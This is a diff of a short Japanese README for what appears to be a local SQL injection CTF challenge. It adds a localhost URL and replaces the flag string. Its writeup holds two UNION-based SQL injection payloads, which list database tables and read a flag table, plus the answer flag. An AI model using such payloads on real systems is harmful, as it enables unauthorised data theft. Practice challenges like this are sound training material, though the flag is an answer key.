@@ -1,7 +1,9 @@
 # sql_injection
 `mysql`でなんか作ってみたよ！
 
-
+```
+http://localhost:30010/
+```
 ## writeup
 
 ' UNION SELECT TABLE_NAME, TABLE_TYPE FROM INFORMATION_SCHEMA.TABLES #
@@ -10,6 +12,7 @@
 
 ' union select flag, 1 from flag_table #
 
+
 ```
-bunaiCTF{FL4SK_1S_USEFUL}
+flag{SQL_1NJECT10N_4ND_LEAK_T4BLES!!}
 ```
